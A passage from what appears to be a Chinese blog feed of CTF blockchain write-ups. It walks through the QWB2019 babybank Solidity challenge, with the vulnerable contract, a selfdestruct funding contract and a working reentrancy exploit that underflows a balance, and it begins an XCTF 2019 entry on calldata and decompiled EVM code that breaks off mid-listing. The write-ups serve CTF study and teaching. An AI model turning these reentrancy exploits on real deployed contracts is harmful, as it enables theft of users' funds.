class="headerlink" title="总结"></a>总结</h2><p>在看这题的时候，题目的逻辑捋的比以前更快了，不过这题的逻辑确实也比较简单，有几个函数都用不上，思路也比较清晰。以后得多用本地调试，真的很好用，除了第一次调试的时候看着一堆opcode头皮发麻，但后面对着opcode表调试勉强能看懂了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re-Entrancy(1)-QWB2019_babybank</title>
    <link href="/2022/09/06/2022-9-6-Re-Entrancy(1)/"/>
    <url>/2022/09/06/2022-9-6-Re-Entrancy(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Re-Entrancy-1"><a href="#Re-Entrancy-1" class="headerlink" title="Re-Entrancy(1)"></a>Re-Entrancy(1)</h1><p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/#2019">wiki部分</a></p><p>什么是重入攻击</p><blockquote><p>假设有两个合约A和合约B，合约A调用合约B。在这种攻击中，当第一个调用仍在执行时，合约B调用合约A，这在某种程度上导致了一个循环。</p></blockquote><p>每当我们将以太坊发送到智能合约地址时，我们都会调用我们所说的fallback函数。</p><p><a href="https://learnblockchain.cn/article/3514">参考文章</a><br><a href="https://github.com/beafb1b1/challenges/blob/master/qwb/2019_crypto_babybank/%E6%BA%90%E7%A0%81/source%26exp.sol">github题目</a><br><a href="http://debugger.wiki/article/html/1566820982138205">wp</a></p><h2 id="QWB2019-babybank"><a href="#QWB2019-babybank" class="headerlink" title="QWB2019_babybank"></a>QWB2019_babybank</h2><p>合约地址<code>0x666dD57a3aFf9768B08a80c55E2000a0a7740541</code><br>攻击账户<code>0x16eBd81c05A40B5D8d52E190819Ef1071E23B1b1</code></p><p>源码如下</p><figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.23</span>;<br><br>contract babybank &#123;<br>    mapping(address =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balance;<br>    mapping(address =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> level;<br>    address owner;<br>    <span class="hljs-keyword">uint</span> secret;<br>    <br>    <span class="hljs-comment">//Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br>    <span class="hljs-comment">//Gmail is ok. 163 and qq may have some problems.</span><br>    event sendflag(<span class="hljs-keyword">string</span> md5ofteamtoken,<span class="hljs-keyword">string</span> b64email); <br>    <br>    <br>    constructor()<span class="hljs-keyword">public</span>&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    <span class="hljs-comment">//pay for flag</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">payforflag</span><span class="hljs-params">(<span class="hljs-keyword">string</span> md5ofteamtoken,<span class="hljs-keyword">string</span> b64email)</span> <span class="hljs-title">public</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(balance[msg.sender] &gt;= <span class="hljs-number">10000000000</span>);<br>        balance[msg.sender]=<span class="hljs-number">0</span>;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    &#125;<br>    <br>    modifier onlyOwner()&#123;<br>        <span class="hljs-keyword">require</span>(msg.sender == owner);<br>        _;<br>    &#125;<br>    <br>    <span class="hljs-comment">//challenge 1 </span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">profit</span><span class="hljs-params">()</span> <span class="hljs-title">public</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(level[msg.sender]==<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">require</span>(<span class="hljs-keyword">uint</span>(msg.sender) &amp; <span class="hljs-number">0xffff</span>==<span class="hljs-number">0xb1b1</span>);<br>        balance[msg.sender]+=<span class="hljs-number">1</span>;<br>        level[msg.sender]+=<span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">//challenge 2</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_secret</span><span class="hljs-params">(<span class="hljs-keyword">uint</span> new_secret)</span> <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span></span>&#123;<br>        secret=new_secret;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span><span class="hljs-params">(<span class="hljs-keyword">uint</span> guess_secret)</span> <span class="hljs-title">public</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(guess_secret==secret);<br>        <span class="hljs-keyword">require</span>(level[msg.sender]==<span class="hljs-number">1</span>);<br>        balance[msg.sender]+=<span class="hljs-number">1</span>;<br>        level[msg.sender]+=<span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">//challenge 3</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span><span class="hljs-params">(address to, <span class="hljs-keyword">uint</span> amount)</span> <span class="hljs-title">public</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(balance[msg.sender] &gt;= amount);<br>        <span class="hljs-keyword">require</span>(amount==<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">require</span>(level[msg.sender]==<span class="hljs-number">2</span>);<br>        balance[msg.sender] = <span class="hljs-number">0</span>;<br>        balance[to] = amount;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span><span class="hljs-params">(<span class="hljs-keyword">uint</span> amount)</span> <span class="hljs-title">public</span></span>&#123;<br>        <span class="hljs-keyword">require</span>(amount==<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">require</span>(balance[msg.sender] &gt;= amount);<br>        msg.sender.call.value(amount*<span class="hljs-number">100000000000000</span>)();<br>        balance[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>payforflag</code>函数是我们的目标，但通常都会有限制，这题就一个要求<code>balance[msg.sender] &gt;= 10000000000</code>，要求balance大于一个很大的数10000000000。</p><p><code>profit</code>要求账户后缀为b1b1，同上一篇文章脚本使用即可生成，然后可以让balance,level都+1。</p><p><code>guess</code>函数会验证secret值，而secret值由只能合约所有者调用的xxx函数赋予；且需要level=1，调用一次之后level提升为2，balance+1。</p><p><code>transfer</code>转账函数，一次只能转2，并且要求level[msg.sender]==2。</p><p><code>withdraw</code>函数就是漏洞点了，漏洞很明显存在重入攻击，并且balance可以下溢出，这样就和payforflag的要求对上了。但是这里需要注意一点合约本身没有eth，并且合约代码中并没有相关可以转入ETH的操作，所以需要用selfdestruct强制转入eth。同时函数要求amount==2。</p><p>所以攻击流程就出来了。</p><ul><li>先部署一个合约通过selfdestruct给题目合约进行转账</li><li>然后切换后缀为<code>b1b1</code>的账户先调用profit()，再guess()。profit函数的绕过，可通过脚本（同上篇文章）获取一个符合条件的地址。guess函数的绕过，secret值在合约交易信息中可找到。</li><li>利用transfer给攻击合约转账2,攻击合约即可重入</li></ul><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>部署转账合约</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.23</span>;<br><br>contract transfer_contract &#123;<br>    address owner;<br>    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params"></span>)</span> &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>&#123;<br><br>    &#125;<br><br>    modifier <span class="hljs-function"><span class="hljs-title">Onlyowner</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">require</span>(msg.sender == owner);<br>        _;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">kill</span>(<span class="hljs-params">address to</span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span>  <span class="hljs-title">Onlyowner</span></span>&#123;<br>        selfdestruct(to);<br>    &#125;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><p>转账1 eth<br><img src="https://img-blog.csdnimg.cn/img_convert/eca280160523522040ffe0282a697dd7.png"></p><p>查看题目合约交易信息发现secret为<code>0x123564831521</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d1a8f4e7fbecfecbb60c4488c9a9eeb5.png"></p><p>依次调用profit(),guess函数。查看storage。<br><img src="https://img-blog.csdnimg.cn/img_convert/275d76c7e6685f63a99f29b1e3daecf2.png"></p><p>部署重入攻击合约</p><figure class="highlight d"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs d"><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.23</span>;<br><br>contract exp&#123;<br><br>    address instance_address = <span class="hljs-number">0</span>x666dD57a3aFf9768B08a80c55E2000a0a7740541;<br>    <span class="hljs-built_in">bool</span> status = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">uint</span> have_withdraw = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">function</span> pay() <span class="hljs-keyword">public</span> &#123;<br>        <span class="hljs-comment">// withdraw</span><br>        <span class="hljs-keyword">if</span>(have_withdraw &gt;= <span class="hljs-number">0</span> )&#123;<br>            address(instance_address).call(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">2</span>);<br>            have_withdraw = have_withdraw -<span class="hljs-number">1</span> ;<br>        &#125;<br><br>    &#125;<br>    <br>    <span class="hljs-built_in">function</span> getflag(<span class="hljs-built_in">string</span> md5ofteamtoken,<span class="hljs-built_in">string</span> b64email) <span class="hljs-keyword">public</span>&#123;<br>        address(instance_address).call(<span class="hljs-number">0</span>x8c0320de,md5ofteamtoken,b64email);<br>    &#125;<br>    <span class="hljs-built_in">function</span>() payable &#123;<br>        <span class="hljs-keyword">if</span> (!status) &#123;<br>            status = <span class="hljs-literal">true</span>;<br>            address(instance_address).call(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">2</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>利用transfer函数给攻击合约转<code>2 amount</code>，攻击合约调用pay()即可重入</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3445385b25b77bfab40cf888f109e9f7.png"></p><p>查看storage，已经下溢出<br><img src="https://img-blog.csdnimg.cn/img_convert/6f5e0e93644b16c47a92b969d7820ef0.png"></p><p>最后调用攻击合约的getflag即可<br><img src="https://img-blog.csdnimg.cn/img_convert/7cdfb8e0288cab993be8fb41e9602cc5.png"></p><p>可以看到交易中还有一个transfer调用，这是因为在<code>payforflag</code>中还存在<code>owner.transfer(address(this).balance);</code>清空合约余额的操作，可能是为了下一个做题者考虑。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ethereum Storage(3)-XCTF_final 2019 Happy_DOuble_Eleven</title>
    <link href="/2022/09/02/2022-9-2-XCTF_final%202019%20Happy_DOuble_Eleven/"/>
    <url>/2022/09/02/2022-9-2-XCTF_final%202019%20Happy_DOuble_Eleven/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-final-2019-Happy-DOuble-Eleven"><a href="#XCTF-final-2019-Happy-DOuble-Eleven" class="headerlink" title="XCTF_final 2019 Happy_DOuble_Eleven"></a>XCTF_final 2019 Happy_DOuble_Eleven</h1><p>[toc]</p><p><a href="https://ctf-wiki.org/blockchain/ethereum/storage/">wiki</a>上推荐的题目。但感觉放在初学的那一节内容得看很久，尤其是关于evm逆向的相关知识，感觉这题复现完也有点蒙蒙的。</p><p><a href="https://hitcxy.com/2019/Happy-DOuble-Eleven/">参考wp</a></p><p>本次复现得合约地址为0xcCaECd49e4Ea39C536291193E9301dF4d5E0A654<br>攻击账户0x90641D6c0691829Dd70C39EE10EA44B26ac8C5AE</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>照着wiki上Ethereum Storage推荐的题目做的，但感觉梯度有点直接太高了，涉及了很多其它攻击，一共学合约就没几天哈哈哈逆向给看麻了，但还是学到了挺多。</p><h3 id="关于重入攻击"><a href="#关于重入攻击" class="headerlink" title="关于重入攻击"></a>关于重入攻击</h3><p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">wiki重入攻击</a></p><h3 id="关于随机数预测"><a href="#关于随机数预测" class="headerlink" title="关于随机数预测"></a>关于随机数预测</h3><p>这题中涉及到了利用区块号生成的随机数是可预测的。<br><a href="https://www.chainpip.com/article/452/142">参考文章1</a><br><a href="https://xz.aliyun.com/t/5614">参考文章2</a><br><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/randomness/">wiki部分</a></p><h3 id="关于msg-data"><a href="#关于msg-data" class="headerlink" title="关于msg.data"></a>关于msg.data</h3><p>msg.data是什么，就是完整的calldata，那calldata又是什么呢，我理解就是调用函数时包含的参数函数签名等等所有的数据。<br>可以参考这个<a href="https://qa.1r1g.cn/ethereum/ask/982621/">例子</a>，这个函数需要5个参数，然后返回msg.data</p><figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMsgData</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  address _address,</span></span><br><span class="hljs-function"><span class="hljs-params">  bytes _bytes,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">uint</span> _int,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">uint</span>[] _array,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">string</span> _string</span></span><br><span class="hljs-function"><span class="hljs-params"> )</span></span><br><span class="hljs-function">  <span class="hljs-title">external</span></span><br><span class="hljs-function">  <span class="hljs-title">returns</span> <span class="hljs-params">(bytes)</span></span><br><span class="hljs-function"> </span>&#123;<br>   <span class="hljs-keyword">return</span> msg.data;<br> &#125;<br></code></pre></div></td></tr></table></figure><p>然后使用以下方式调用函数</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp">contract.getMsgData(<br> someAddress,<br> web3.toHex(<span class="hljs-string">&#x27;my bytes&#x27;</span>),<br> <span class="hljs-number">12</span>,<br> [<span class="hljs-meta">1, 4, 412</span>],<br> <span class="hljs-string">&#x27;thisislargerthanthirtytwobytesstring&#x27;</span><br>);<br></code></pre></div></td></tr></table></figure><p>最后返回的msg.data是这样的，可以看到第一行是调用的函数签名，后面一次是函数需要的参数值。其实这样来看的话就是理解abi了就行了。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">0</span>xd1621754 // (<span class="hljs-number">1</span>) methodId<br><span class="hljs-number">000000000000000000000000</span>c6e012db5298275a4c11b3e07d2caba88473fce1 // (<span class="hljs-number">2</span>) <span class="hljs-string">&quot;_address&quot;</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>a0 // (<span class="hljs-number">3</span>) location of start of <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">7</span>) = <span class="hljs-number">160</span> bytes<br><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000000</span>c // (<span class="hljs-number">4</span>) <span class="hljs-string">&quot;_val&quot;</span> = <span class="hljs-number">12</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000e0</span> // (<span class="hljs-number">5</span>) location of start of <span class="hljs-string">&quot;_array&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">9</span>) = <span class="hljs-number">224</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000160 </span>// (<span class="hljs-number">6</span>) location of start of <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> (item <span class="hljs-number">13</span>) = <span class="hljs-number">352</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000008 </span>// (<span class="hljs-number">7</span>) size of <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> in bytes (<span class="hljs-number">32</span> bytes)<br><span class="hljs-number">6d79206279746573000000000000000000000000000000000000000000000000</span> // (<span class="hljs-number">8</span>) <span class="hljs-string">&quot;_bytes&quot;</span> <span class="hljs-keyword">data</span> padded <span class="hljs-keyword">to</span> <span class="hljs-number">32</span> bytes<br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000003 </span>// (<span class="hljs-number">9</span>) length of <span class="hljs-string">&quot;_array&quot;</span> <span class="hljs-keyword">data</span> = <span class="hljs-number">3</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000001 </span>// (<span class="hljs-number">10</span>) _array[<span class="hljs-number">0</span>] value = <span class="hljs-number">1</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000004 </span>// (<span class="hljs-number">11</span>) _array[<span class="hljs-number">2</span>] value = <span class="hljs-number">4</span><br><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000019</span>c // (<span class="hljs-number">12</span>) _array[<span class="hljs-number">3</span>] value = <span class="hljs-number">412</span><br><span class="hljs-symbol">0000000000000000000000000000000000000000000000000000000000000024 </span>// (<span class="hljs-number">13</span>) size of <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> in bytes (<span class="hljs-number">64</span> bytes)<br><span class="hljs-number">7468697369736</span>c61726765727468616e74686972747974776f6279746573737472696e670..<span class="hljs-number">0</span> // (<span class="hljs-number">14</span>) <span class="hljs-string">&quot;_string&quot;</span> <span class="hljs-keyword">data</span> padded <span class="hljs-keyword">to</span> <span class="hljs-number">64</span> bytes<br></code></pre></div></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>合约地址0x7D43878EFBF99C6B5B0eb288026B1d48588C1793</p><p>合约反编译出来有这些函数。<br><img src="https://img-blog.csdnimg.cn/img_convert/a99867c55e40643914b60783a51a5239.png"></p><p>反汇编出来最开始的那一段是这样的。<br><img src="https://img-blog.csdnimg.cn/img_convert/068b9e3539aee35eef72205b2f40c8b3.png"></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">contract Contract &#123;<br>    function main() &#123;<br>    #进入main函数，把0x80写到[0x40 ,0x40 + 0x20]这块内存里面,因为内存是空的,这会创建新的内存<br> #对应的opcode操作<br> #PUSH1 0x80 <br> #PUSH1 0x40 <br> #MSTORE  即为  MSTORE(arg0, arg1)从栈中获取两个参数，表示MEM[0x40:(0x40+32)&#x3D;0x60] &#x3D; 0x80。<br> #正在做的是分配96个字节的存储器并将指针移动到第64个字节的开头。 我们现在有64个字节用于临时空间，32个字节用于临时存储器存储。<br> #可靠性文档声明如下：&quot;Solidity以一种非常简单的方式管理内存：内存中位置0x40有一个&quot;空闲内存指针&quot;。如果你想分配内存，只需使用该点的内存并相应地更新指针。&quot;<br>     #其实还是没太看明白这里在干啥也许就像re里面的初始化空间吧。<br>        memory[0x40:0x60] &#x3D; 0x80;<br>    <br>    # 判断用户输入的data内容长度是否小于4，如果满足就revert（关于revert,assert,require的比较）<br>    #其实就是判断是否是正确的调用函数的字节数，因为调用函数需要使用其前四字节，如果小于就明显不对。<br>        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>    #与上0xffffffff（即四字节）获取data的低4位，赋值给var0，其实就是取函数签名，前四个字节（函数签名四个字节表示为0xffffffff类型） ，<br>    #EVM里对函数的调用都是取bytes4(keccak256(函数名(参数类型1,参数类型2))传递的，即对函数签名做keccak256哈希后取前4字节<br>        var var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;<br><br>然后利用var0来判断调用哪个函数<br></code></pre></div></td></tr></table></figure><h3 id="0x6bc344bc-payforflag-string"><a href="#0x6bc344bc-payforflag-string" class="headerlink" title="0x6bc344bc payforflag(string)"></a>0x6bc344bc payforflag(string)</h3><p>因为第一次逆向合约，是对着源码一起看的，反编译代码和注释分析如下。<br>首先看调用payforflag的地方,这里我看了挺久的也问了一些大佬,2333evm逆向真不比re简单啊。</p><p>这里就涉及到了msg.data我们看看直接调用这个函数的完整calldata。很容易看懂，string类型是边长的，所以第一个byte32就是string的offset 0x20（函数就一个参数）。然后第二个就是string的长度0x06，最后一个就是string值了。<br><img src="https://img-blog.csdnimg.cn/img_convert/f91a50dd56096f4010c788b47f70f8fe.png"></p><p>所以这里temp2就是offset了然后还得加上函数签名的四字节，temp3获取到string的长度，但是temp4不是从msg.data里面取值了，temp4是空闲内存指针的值</p><p>然后对于中间那三个memory的操作，首先可以看懂这篇<a href="https://icode.best/i/72240947133769">文章</a>，sodility文档内联汇编部分也讲了。</p><ul><li><p>所以<code>memory[0x40:0x60] = temp4 + (temp3 + 0x1f) / 0x20 * 0x20 + 0x20;</code>就是在计算空闲内存指针实际指向的位置，然后放入，memory[0x40:0x60]中，memory[0x40:0x60]就类似于一个入口点的样子。</p></li><li><p>计算出空闲内存指针实际位置之后，就开始从这个新地址分配内存来存放一些函数需要使用的参数临时数据。例如这里最先存储的是temp3即string长度</p></li><li><p>然后将string参数的值放到了memory[temp4 + 0x20:temp4 + 0x20 + temp3]</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">else if (var0 &#x3D;&#x3D; 0x6bc344bc) &#123;<br>            &#x2F;&#x2F; Dispatch table entry for payforflag(string)<br>            var1 &#x3D; msg.value;<br>            <br>            if (var1) &#123; revert(memory[0x00:0x00]); &#125;<br>            <br>            var1 &#x3D; 0x0282;<br>            var temp2 &#x3D; msg.data[0x04:0x24] + 0x04;<br>            var temp3 &#x3D; msg.data[temp2:temp2 + 0x20];<br>            var temp4 &#x3D; memory[0x40:0x60];<br>            memory[0x40:0x60] &#x3D; temp4 + (temp3 + 0x1f) &#x2F; 0x20 * 0x20 + 0x20;<br>            memory[temp4:temp4 + 0x20] &#x3D; temp3;<br>            memory[temp4 + 0x20:temp4 + 0x20 + temp3] &#x3D; msg.data[temp2 + 0x20:temp2 + 0x20 + temp3];<br>            var2 &#x3D; temp4;<br>            payforflag(var2);<br>            stop();<br></code></pre></div></td></tr></table></figure><p>函数里面有几个要求</p></li><li><p>要求 msg.sender == storage[0x00]（所以最开始肯定定义了address public owner这种，并且这里大概率使用了onlyOwner来修饰这个函数）</p></li><li><p>要求 msg.sender 后三12位为 0x111</p></li><li><p>要求 storage[0x06] == 0x03</p></li><li><p>要求 storage[0x05] &gt; 0x8ac7230489e80000 （感觉这种就能判断为mapping类型并且大概率类似mapping (address =&gt; uint)）</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 